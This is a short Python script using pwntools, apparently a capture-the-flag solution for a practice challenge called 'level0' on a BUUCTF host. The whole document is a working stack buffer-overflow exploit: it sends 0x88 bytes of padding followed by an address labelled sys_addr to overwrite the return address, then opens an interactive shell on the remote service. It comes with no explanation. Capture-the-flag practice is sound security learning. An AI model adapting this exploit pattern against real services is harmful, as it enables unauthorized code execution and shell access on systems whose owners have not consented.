from pwn import *

# sh = process("./level0")
sh = remote("node3.buuoj.cn", 25909)

sys_addr = 0x400596

payload = cyclic(0x80 + 8) + p64(sys_addr)
sh.sendline(payload)

sh.interactive()
